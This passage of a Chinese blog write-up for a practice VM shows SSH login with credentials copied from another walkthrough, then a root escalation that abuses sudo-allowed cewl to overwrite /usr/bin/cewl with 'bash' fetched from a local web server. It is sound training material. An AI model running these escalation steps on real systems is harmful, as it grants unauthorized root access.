+</span></span><span class=line><span class=cl>apt.extended_states.3.gz  dpkg.statoverride.1.gz    shadow.bak
+</span></span><span class=line><span class=cl>apt.extended_states.4.gz  dpkg.status.0
+</span></span></code></pre></div><p>看一下权限</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@Combine:/var/backups$ ls -al
+</span></span><span class=line><span class=cl>ls -al
+</span></span><span class=line><span class=cl>total <span class=m>804</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root     <span class=m>4096</span> Oct <span class=m>14</span> 06:25 .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>12</span> root root     <span class=m>4096</span> Apr  <span class=m>1</span>  <span class=m>2025</span> ..
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root    <span class=m>51200</span> Oct <span class=m>13</span> 06:25 alternatives.tar.0
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root    <span class=m>24470</span> Oct <span class=m>10</span> 09:16 apt.extended_states.0
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root     <span class=m>2568</span> Apr <span class=m>11</span>  <span class=m>2025</span> apt.extended_states.1.gz
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root     <span class=m>2556</span> Apr  <span class=m>4</span>  <span class=m>2025</span> apt.extended_states.2.gz
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root     <span class=m>2006</span> Apr  <span class=m>1</span>  <span class=m>2025</span> apt.extended_states.3.gz
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root     <span class=m>1542</span> Apr  <span class=m>1</span>  <span class=m>2025</span> apt.extended_states.4.gz
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root      <span class=m>757</span> Mar <span class=m>30</span>  <span class=m>2025</span> apt.extended_states.5.gz
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root      <span class=m>356</span> Apr <span class=m>11</span>  <span class=m>2025</span> dpkg.diversions.0
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root      <span class=m>168</span> Apr <span class=m>11</span>  <span class=m>2025</span> dpkg.diversions.1.gz
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root      <span class=m>172</span> Apr  <span class=m>1</span>  <span class=m>2025</span> dpkg.statoverride.0
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root      <span class=m>161</span> Apr  <span class=m>1</span>  <span class=m>2025</span> dpkg.statoverride.1.gz
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root   <span class=m>541833</span> Oct <span class=m>10</span> 09:16 dpkg.status.0
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root   <span class=m>138093</span> Oct <span class=m>10</span> 09:16 dpkg.status.1.gz
+</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root      <span class=m>703</span> Oct <span class=m>10</span> 09:09 group.bak
+</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root shadow    <span class=m>586</span> Oct <span class=m>10</span> 09:09 gshadow.bak
+</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root     <span class=m>1451</span> Oct <span class=m>10</span> 09:11 passwd.bak
+</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root shadow    <span class=m>968</span> Oct <span class=m>10</span> 09:11 shadow.bak
+</span></span></code></pre></div><p>把所有可读的文件都读一遍，没屁用，突然想起来之前群里的讨论</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>某群友:我这只有apt.extended_states.0 和 apt.extended_states.<span class=o>[</span>1-5<span class=o>]</span>.gz
+</span></span></code></pre></div><p>看了下wp，卧槽，我这里也没有那个可以得到账号密码的文件，那算了，我直接抄账号密码登录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# ssh dashamao@192.168.56.106                                                 
+</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;192.168.56.106 (192.168.56.106)&#39;</span> can<span class=s1>&#39;t be established.
+</span></span></span><span class=line><span class=cl><span class=s1>ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
+</span></span></span><span class=line><span class=cl><span class=s1>This host key is known by the following other names/addresses:
+</span></span></span><span class=line><span class=cl><span class=s1>    ~/.ssh/known_hosts:1: [hashed name]
+</span></span></span><span class=line><span class=cl><span class=s1>    ~/.ssh/known_hosts:3: [hashed name]
+</span></span></span><span class=line><span class=cl><span class=s1>    ~/.ssh/known_hosts:7: [hashed name]
+</span></span></span><span class=line><span class=cl><span class=s1>    ~/.ssh/known_hosts:8: [hashed name]
+</span></span></span><span class=line><span class=cl><span class=s1>    ~/.ssh/known_hosts:9: [hashed name]
+</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>192.168.56.106<span class=s1>&#39; (ED25519) to the list of known hosts.
+</span></span></span><span class=line><span class=cl><span class=s1>dashamao@192.168.56.106&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Linux Combine 4.19.0-27-amd64 <span class=c1>#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
+</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
+</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class=line><span class=cl>permitted by applicable law.
+</span></span><span class=line><span class=cl>dashamao@Combine:~$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>dashamao<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>dashamao<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>dashamao<span class=o>)</span>
+</span></span></code></pre></div><p>相当狼狈的提到user了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dashamao@Combine:~$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> dashamao on Combine:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User dashamao may run the following commands on Combine:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/bin/cewl
+</span></span></code></pre></div><p>日常权限检查发现猫腻，搜了一圈cewl提权没结果，查看wp简直被吓坏了</p><p>用cewl的工具特性来进行提权，实在高</p><p>关于cewl，谷歌一下不难知道他是一种密码生成工具，可以根据爬取的网页来生成密码到指定目录</p><p>所以我们本地可以准备起一个python服务，然后内容为bash四个字，由于其他的路径没有写入权限，我们可以利用cewl把python服务的bash写入到cewl中，然后就可以进行提权</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/test<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# <span class=nb>echo</span> <span class=s1>&#39;bash&#39;</span>&gt;a
+</span></span><span class=line><span class=cl>                                                                                                                                        
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/test<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# python3 -m http.server <span class=m>80</span>
+</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>80</span> <span class=o>(</span>http://0.0.0.0:80/<span class=o>)</span> ...
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dashamao@Combine:~$ sudo /usr/bin/cewl http://192.168.56.106/a -w /usr/bin/cewl
+</span></span><span class=line><span class=cl>CeWL 5.4.8 <span class=o>(</span>Inclusion<span class=o>)</span> Robin Wood <span class=o>(</span>robin@digi.ninja<span class=o>)</span> <span class=o>(</span>https://digi.ninja/<span class=o>)</span>
+</span></span></code></pre></div><p>然后bash就被写入了cewl</p><p>最后我们只需要</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo /usr/bin/cewl
+</span></span></code></pre></div><p>即可提权到root</p></div><footer class=post-footer><div class=post-footer__tags><a href=/tags/%E9%9D%B6%E6%9C%BA/ data-pagefind-filter=tag>靶机</a></div><div class=post-footer__license>Licensed under CC BY-NC-SA 4.0</div><nav class=post-footer__nav><a href=/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAronos/><small>← Previous</small>
+<span>群友靶机Ronos</span>
+</a><a href=/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby/ class=post-footer__nav-next><small>Next →</small>
+<span>群友靶机Baby</span></a></nav></footer></article></div></div><footer class=site-footer><div class=container><div class=site-footer__social><a href=https://github.com/GCXWLP target=_blank rel=noopener title=GitHub><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
+</a><a href=mailto:eminemgcxwlp@gmail.com target=_blank rel=noopener title=Email><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</a><a href=/index.xml target=_blank rel=noopener title=RSS><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><div class=site-footer__copy>&copy; 2025 - 2026 Twansh's blog</div><div class=site-footer__stats><span>65 posts</span>
+<span>73.3k words</span></div><div class=site-footer__powered>Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a></div></div></footer><div class=search-overlay id=search-overlay role=dialog aria-label=Search><div class=search-overlay__dialog><div class=search-overlay__input-wrap><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+<input type=text id=search-input placeholder=搜索文章标题、标签、分类或正文... autocomplete=off></div><div class=search-overlay__results id=search-results><div class=search-overlay__empty>输入关键词开始搜索</div></div></div></div><script defer src=/js/theme-toggle.min.9d3288aa4ff1e33e40906fb67350ea3f5dad1533f19d7428a2335ceac6bf3c4e.js></script><script defer src=/js/search.min.6145f9c11b47c22f4014c24c80522fe739d7844fc997719a3bc26c050c908051.js></script><script defer src=/js/code-copy.min.f61de5ab74980e8e52ca0081d6fedb33bc5496b41391a410ef15ed6e014e502d.js></script></body></html>
